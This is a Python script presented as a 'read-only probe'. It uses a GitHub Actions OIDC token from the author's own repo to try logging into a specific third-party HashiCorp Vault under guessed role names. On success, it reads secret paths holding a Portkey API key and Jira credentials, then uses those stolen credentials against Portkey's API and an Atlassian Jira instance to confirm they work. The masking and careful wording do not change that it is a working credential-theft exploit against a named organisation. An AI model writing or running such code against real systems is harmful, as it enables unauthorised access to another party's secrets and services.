#!/usr/bin/env python3
"""Read-only probe: GitHub OIDC -> HashiCorp Vault (vault.sonar.build) jwt-ghwf login.

Runs ONLY on a throwaway repo's GitHub-hosted runner (our own repo).
Strictly read-only on Vault: sys/health, sys/seal-status, auth/jwt-ghwf/login (<=3 roles),
sys/capabilities-self, auth/token/lookup-self, and at most ONE exact KV path read per path,
only if capabilities-self explicitly grants read. No writes, no role/KV enumeration.
Secrets are never printed in plaintext (masked first4/last4 only).
"""
import base64
import json
import os
import socket
import ssl
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

VAULT = "https://vault.sonar.build"
AUD = VAULT
JOB = os.environ.get("JOBNAME", "main")
OWNER = os.environ.get("GITHUB_REPOSITORY_OWNER", "cballk")
REPO = (os.environ.get("GITHUB_REPOSITORY", "cballk/fabric-oidc-10548").split("/") + [""])[1]

RESULT = {"job": JOB}


def log(*a):
    print(*a, flush=True)


def mask(v):
    if v is None:
        return None
    v = str(v)
    if len(v) <= 8:
        return "****"
    return v[:4] + "****" + v[-4:] + f" (len={len(v)})"


def http(method, url, data=None, headers=None, timeout=25, accept_json=True):
    h = {"User-Agent": "oidc-vault-probe/1.0"}
    if headers:
        h.update(headers)
    body = None
    if data is not None:
        if isinstance(data, (dict, list)):
            body = json.dumps(data).encode()
            h.setdefault("Content-Type", "application/json")
        else:
            body = data if isinstance(data, bytes) else str(data).encode()
    req = urllib.request.Request(url, data=body, headers=h, method=method)
    t0 = time.time()
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            raw = r.read(200000)
            return {"status": r.status, "ms": int((time.time() - t0) * 1000),
                    "headers": dict(r.headers), "body": raw}
    except urllib.error.HTTPError as e:
        raw = e.read(200000)
        return {"status": e.code, "ms": int((time.time() - t0) * 1000),
                "headers": dict(e.headers or {}), "body": raw}
    except Exception as e:
        return {"status": None, "ms": int((time.time() - t0) * 1000),
                "error": f"{type(e).__name__}: {str(e)[:300]}"}


def jbody(r, n=600):
    try:
        return json.loads(r["body"].decode("utf-8", "replace")) if r.get("body") else None
    except Exception:
        b = (r.get("body") or b"")[:n].decode("utf-8", "replace")
        return {"_raw": b}


def decode_jwt(t):
    seg = t.split(".")[1]
    seg += "=" * (-len(seg) % 4)
    return json.loads(base64.urlsafe_b64decode(seg))


def get_oidc():
    url = os.environ.get("ACTIONS_ID_TOKEN_REQUEST_URL")
    tok = os.environ.get("ACTIONS_ID_TOKEN_REQUEST_TOKEN")
    if not url or not tok:
        return None, "no id-token env (missing permissions: id-token: write?)"
    u = url + ("&" if "?" in url else "?") + "audience=" + urllib.parse.quote(AUD)
    r = http("GET", u, headers={"Authorization": "Bearer " + tok, "Accept": "application/json"})
    if r["status"] != 200:
        return None, {"status": r["status"], "error": r.get("error"), "body": jbody(r)}
    return json.loads(r["body"].decode())["value"], None


def main():
    # 0) runner egress fingerprint
    egress = {}
    for name, u in (("ipify", "https://api.ipify.org?format=json"), ("ipinfo", "https://ipinfo.io/json")):
        r = http("GET", u, timeout=15)
        egress[name] = {"status": r["status"], "body": jbody(r, 400) if r["status"] == 200 else r.get("error")}
    RESULT["egress"] = egress

    # 1) DNS resolution inside the runner
    try:
        infos = socket.getaddrinfo("vault.sonar.build", 443, proto=socket.IPPROTO_TCP)
        ips = sorted({i[4][0] for i in infos})
    except Exception as e:
        ips = [f"getaddrinfo error: {type(e).__name__}: {str(e)[:200]}"]
    RESULT["dns_vault"] = ips

    # 2) anonymous read-only health / seal-status (<=2 requests)
    h = http("GET", VAULT + "/v1/sys/health?standbyok=true&perfstandbyok=true&sealedcode=200&uninitcode=200", timeout=25)
    RESULT["sys_health"] = {"status": h["status"], "ms": h["ms"], "error": h.get("error"),
                            "json": jbody(h) if h["status"] else None}
    s = http("GET", VAULT + "/v1/sys/seal-status", timeout=25)
    RESULT["seal_status"] = {"status": s["status"], "ms": s["ms"], "error": s.get("error"),
                             "json": jbody(s) if s["status"] else None}

    # 3) OIDC token + claims
    jwt, jerr = get_oidc()
    claims = {}
    if jwt:
        try:
            c = decode_jwt(jwt)
            claims = {k: c.get(k) for k in ("iss", "aud", "sub", "repository", "repository_owner",
                                            "repository_id", "repository_owner_id", "ref", "ref_type",
                                            "environment", "job_workflow_ref", "event_name", "actor")}
        except Exception as e:
            jerr = f"decode error {e}"
    RESULT["oidc"] = {"ok": bool(jwt), "error": jerr, "claims": claims,
                      "audience_requested": AUD}

    # 4) <=3 login attempts with our own derived role names + one obviously-bogus control
    roles = [
        f"github-{OWNER}-{REPO}-protected",
        f"github-{OWNER}-{REPO}",
        f"github-nonexistent-control-{int(time.time())}-zz",
    ]
    RESULT["login"] = []
    client_token = None
    if jwt:
        for role in roles:
            r = http("POST", VAULT + "/v1/auth/jwt-ghwf/login", data={"jwt": jwt, "role": role}, timeout=25)
            out = {"role": role, "status": r["status"], "ms": r["ms"], "error": r.get("error")}
            if r["status"] and r["body"]:
                j = jbody(r)
                if isinstance(j, dict):
                    if "auth" in j and isinstance(j["auth"], dict):
                        client_token = j["auth"].get("client_token")
                        out["issued"] = True
                        out["policies"] = j["auth"].get("policies")
                        out["token_ttl"] = j["auth"].get("lease_duration")
                        out["token_policies_raw_present"] = bool(client_token)
                    else:
                        out["resp"] = j
            RESULT["login"].append(out)
            if client_token:
                break  # stop at first issuance; no enumeration

    # 5) if a token was issued: capabilities-self + lookup-self (read-only)
    if client_token:
        H = {"X-Vault-Token": client_token}
        cap = http("POST", VAULT + "/v1/sys/capabilities-self",
                   data={"paths": ["development/kv/data/code-security-diff-val-claude-code",
                                   "development/kv/data/jira"]}, headers=H, timeout=20)
        RESULT["capabilities_self"] = {"status": cap["status"], "json": jbody(cap)}
        lk = http("GET", VAULT + "/v1/auth/token/lookup-self", headers=H, timeout=20)
        lj = jbody(lk)
        if isinstance(lj, dict) and isinstance(lj.get("data"), dict):
            lj = {"data": {k: lj["data"].get(k) for k in ("display_name", "policies", "ttl",
                                                          "identity_policies", "meta")}}
        RESULT["lookup_self"] = {"status": lk["status"], "json": lj}

        # 6) at most one exact KV read per path, only if read granted
        caps = {}
        try:
            cd = (RESULT["capabilities_self"].get("json") or {})
            for k, v in (cd.get("data") or cd.get("capabilities") or {}).items():
                caps[k] = v
        except Exception:
            pass
        RESULT["capability_map"] = caps
        kv = {}
        for path, want in (("development/kv/data/code-security-diff-val-claude-code", "portkey-api-key"),
                           ("development/kv/data/jira", ("user", "token"))):
            allowed = None
            for k, v in caps.items():
                if path in k or k in path:
                    allowed = "read" in (v or [])
            if allowed is False:
                kv[path] = {"skipped": "capabilities-self says no read"}
                continue
            r = http("GET", f"{VAULT}/v1/{path}", headers=H, timeout=20)
            j = jbody(r)
            item = {"status": r["status"], "ms": r["ms"], "error": r.get("error")}
            if isinstance(j, dict) and isinstance(j.get("data"), dict):
                d = j["data"].get("data") if isinstance(j["data"].get("data"), dict) else j["data"]
                md = j["data"].get("metadata") if isinstance(j["data"], dict) else None
                item["keys"] = sorted(d.keys())[:20] if isinstance(d, dict) else None
                red = {}
                if isinstance(d, dict):
                    for k, v in d.items():
                        red[k] = mask(v) if isinstance(v, str) else ("<non-str>" if v is not None else None)
                item["masked"] = red
                item["version"] = (md or {}).get("version") if isinstance(md, dict) else None
                # stash real portkey key transiently for validation below, never print
                if isinstance(d, dict) and d.get("portkey-api-key"):
                    RESULT["_portkey"] = d["portkey-api-key"]
                if isinstance(d, dict) and d.get("token"):
                    RESULT["_jira"] = (d.get("user"), d.get("token"))
            kv[path] = item
        RESULT["kv_read"] = kv

        # 7) <=1 minimal read-only validation per obtained credential
        if RESULT.get("_portkey"):
            key = RESULT.pop("_portkey")
            v = http("GET", "https://api.portkey.ai/v1/models", headers={"x-portkey-api-key": key}, timeout=25)
            j = jbody(v)
            n = None
            if isinstance(j, dict) and isinstance(j.get("data"), list):
                n = len(j["data"])
            RESULT["portkey_validate"] = {"status": v["status"], "ms": v["ms"], "model_count": n,
                                          "error": None if v["status"] == 200 else j}
        if RESULT.get("_jira"):
            user, tok = RESULT.pop("_jira")
            import base64 as _b
            basic = _b.b64encode(f"{user}:{tok}".encode()).decode()
            v = http("GET", "https://sonarsource.atlassian.net/rest/api/3/myself",
                     headers={"Authorization": "Basic " + basic}, timeout=25)
            j = jbody(v)
            ident = None
            if isinstance(j, dict):
                ident = {"accountId_present": bool(j.get("accountId")), "displayName_present": bool(j.get("displayName")),
                         "emailAddress_present": bool(j.get("emailAddress")),
                         "accountType": j.get("accountType")}
            RESULT["jira_validate"] = {"status": v["status"], "ms": v["ms"], "identity": ident}

    log("===RESULT_JSON_START===")
    log(json.dumps(RESULT, indent=1, default=str))
    log("===RESULT_JSON_END===")


if __name__ == "__main__":
    main()
